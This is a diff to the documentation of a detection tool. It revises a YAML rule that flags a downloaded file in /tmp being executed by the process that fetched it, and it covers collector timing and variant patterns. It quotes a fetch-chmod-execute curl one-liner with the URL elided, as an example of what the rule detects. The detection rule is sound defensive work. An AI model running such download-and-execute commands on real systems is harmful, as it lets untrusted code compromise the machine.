@@ -778,26 +778,31 @@ exclusions:
 
 ### 4. Download and execute
 
-A process connects out, writes a file under `/tmp`, and a child it spawns runs
-exactly that file.
+Something downloads a file into `/tmp`, and the process that started the
+download then runs exactly that file. This is what
+`curl -o /tmp/x http://… ; chmod +x /tmp/x ; /tmp/x` looks like: the shell
+(`launcher`) starts `curl` (`downloader`), which connects out and creates the
+file, and then starts the file itself (`payload`).
 
 ```yaml
 - name: download-and-execute
   severity: CRITICAL
   title: Downloaded file executed
   description: >-
-    A process made a network connection, created a file under /tmp, and then
-    spawned a process running that file.
+    A process made a network connection and created a file under /tmp, and
+    the process that started it then ran that file.
   processes:
-    - id: dropper
+    - id: launcher
+    - id: downloader
     - id: payload
   relationships:
-    - { type: SPAWNED, parent: dropper, child: payload }
+    - { type: SPAWNED, parent: launcher, child: downloader }
+    - { type: SPAWNED, parent: launcher, child: payload }
   sequence:
     within: 60s
     steps:
-      - { role: dropper, type: NETWORK_CONNECT }
-      - role: dropper
+      - { role: downloader, type: NETWORK_CONNECT }
+      - role: downloader
         type: FILE_CREATE
         where: { path: { glob: "/tmp/**" } }
         capture: dropped
@@ -806,10 +811,27 @@ exactly that file.
         where: { exe: { eq: $dropped.path } }
 ```
 
-The capture is what makes this specific: a child running `/usr/bin/id` does not
-match, only one whose executable is the file just created. The default
-`order_tolerance` matters here, because the connection and the process start
-are polled and the file event is not.
+The capture is what makes this specific: a second child running `/usr/bin/id`
+does not match, only one whose executable is the file just created. The
+default `order_tolerance` matters here, because the connection is noticed by
+polling, up to two seconds after it was made, and the file event is not.
+
+Whether this fires on a real attack depends on how processes are collected.
+A downloaded payload often runs for a few milliseconds. With the `ebpf`
+process collector its `PROCESS_START` is reported whatever its lifetime; with
+`poll` it is seen only if it is still running at the next two-second poll. See
+[How processes are collected](#how-processes-are-collected).
+
+Two variations are worth knowing:
+
+- A program that downloads the file and runs it itself (a script using an HTTP
+  library, say) has no separate downloader. Drop the `launcher` role, relate
+  `downloader` to `payload` directly, and keep the same sequence.
+- A shell given a list of commands may run the last one without forking, by
+  exec'ing it in place. The payload is then the shell process itself, and
+  what is reported is a `PROCESS_EXEC` on the `launcher`, not a
+  `PROCESS_START` of a child. To cover that as well, add a second pattern
+  whose last step is `{ role: launcher, type: PROCESS_EXEC, where: { exe: { eq: $dropped.path } } }`.
 
 ### 5. Shell at any depth below a web server, connecting to a non-standard port
 
